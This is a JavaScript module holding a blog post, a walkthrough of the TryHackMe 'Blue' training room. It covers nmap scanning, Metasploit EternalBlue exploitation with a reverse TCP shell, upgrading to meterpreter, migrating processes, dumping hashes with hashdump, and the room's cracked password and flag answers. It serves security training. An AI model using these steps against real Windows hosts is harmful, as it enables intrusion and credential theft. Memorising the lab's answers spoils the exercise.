export default {
    id: 'blue',
    title: 'Blue',
    category: 'TryHackMe',
    difficulty: 'Easy',
    tags: ['Penetration Testing', 'Windows'],
    date: '2026-01-29T12:00:00',
    excerpt: 'Write up and walkthrough of Blue room on TryHackMe.',
    content: `
This is a write up and walkthrough of the Blue room on TryHackMe.

⸻⸻⸻⸻⸻

### Task 1 Recon

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.

The virtual machine used in this room (Blue) can be downloaded for offline usage from https://darkstar7471.com/resources.html

*Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.*

**Answer the questions below**⸻⸻⸻⸻⸻

Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)
**Answer:** No answer needed
**Reason:** Run \`nmap -sV -sS -vv <target_system_ip>\` to scan all ports on the target system.

How many ports are open with a port number under 1000?
**Answer:** 3
**Reason:** Count the number of open ports with a port number under 1000 in the output of nmap.

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
**Answer:** ms17-010
**Reason:** Check the Service and Version output from the Nmap scan. Since the target system is running Windows 7, it is likely to be vulnerable to MS17-010.

⸻⸻⸻⸻⸻

### Task 2 Gain Access

Exploit the machine and gain a foothold.

**Answer the questions below**⸻⸻⸻⸻⸻

Start Metasploit
**Answer:** No answer needed
**Reason:** Run \`msfconsole\` to start Metasploit.

Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
**Answer:** exploit/windows/smb/ms17_010_eternalblue
**Reason:** Run \`search ms17-010\` in Metasploit Framework. Since EternalBlue is an exploit for MS17-010, we can use it to exploit the target system.

Show options and set the one required value. What is the name of this value? (All caps for submission)
**Answer:** RHOSTS
**Reason:** Run \`show options\` to see the options available. Remember to always set RHOSTS to the target system's IP address.

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

\`set payload windows/x64/shell/reverse_tcp\`

With that done, run the exploit!
**Answer:** No answer needed
**Reason:** Run \`exploit\` or \`run\` to start the exploit.

Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.
**Answer:** No answer needed
**Reason:** Run \`sessions\` to see the list of active sessions. If there is no session, try running the exploit again. If it still doesn't work, reboot the target VM and try again.

⸻⸻⸻⸻⸻

### Task 3 Escalate

Escalate privileges, learn how to upgrade shells in metasploit.

**Answer the questions below**⸻⸻⸻⸻⸻

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
**Answer:** post/multi/manage/shell_to_meterpreter
**Reason:** Google it or search in Metasploit Framework using \`search shell_to_meterpreter\`.

Select this (use MODULE_PATH). Show options, what option are we required to change?
**Answer:** SESSION
**Reason:** Run \`show options\` to see the options available. Remeber to set the SESSION and LHOST value.

Set the required option, you may need to list all of the sessions to find your target here.

Run! If this doesn't work, try completing the exploit from the previous task once more.
**Answer:** No answer needed
**Reason:** Run \`run\` or \`exploit\` to start the post module.

Once the meterpreter shell conversion completes, select that session for use.
**Answer:** No answer needed
**Reason:** Run \`sessions\` to see the list of active sessions. Then run \`sessions -i <session_number>\` to interact with the session.

Verify that we have escalated to NT AUTHORITY\\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\\SYSTEM and write down the process id (far left column).

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

⸻⸻⸻⸻⸻

### Task 4 Cracking

Dump the non-default user's password and crack it!

**Answer the questions below**⸻⸻⸻⸻⸻

Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
**Answer:** Jon

Copy this password hash to a file and research how to crack it. What is the cracked password?
**Answer:** alqfna22
**Reason:** Copy the hash and use a rainbow table to crack it.

⸻⸻⸻⸻⸻

### Task 5 Find flags!

Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!

-----------------------------------------------------------------

**Answer the questions below**⸻⸻⸻⸻⸻

Flag1? This flag can be found at the system root.
**Answer:** flag{access_the_machine}
**Reason:**
1. Run \`shell\` to access Powershell.
2. Run \`cd /\` to access root.
3. Run \`dir\` to list all files and directories.
4. Run \`type flag1.txt\` to read the flag.

Flag2? This flag can be found at the location where passwords are stored within Windows.

\\*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 
**Answer:** flag{sam_database_elevated_access}
**Reason:**
1. Search up Google "Where do windows usually store their passwords?". Google answered: "Windows stores user account passwords in a hashed format within the Security Accounts Manager (SAM) database, located at C:\\Windows\\System32\\config\\SAM".
2. Using the knowledge we can use \`cd\` to go over to the location. However, we can only go to \`C:\\Windows\\System32\\config\`. This create access denied error when we try to access the SAM file. Therefore, I decided to run \`dir\` to see if there are any other files that might contain the flag.
3. Run \`type flag2.txt\` to read the flag.

flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.
**Answer:** flag{admin_documents_can_be_valuable}
**Reason:** Since we know the format of the first two flags, we can search for the third flag by going back to the meterpreter by \`CTRL+Z\` then run \`search -f flag3.txt\`. From there we can go back to Powershell by running \`shell\` then run \`type <file-path>\` to read the flag.
**Note:** Since this is a way to find the flag, we can use this method to quickly find flags in CTFs. However, in the real world, it is best practice to go into each directories and check the documents yourself.
`
}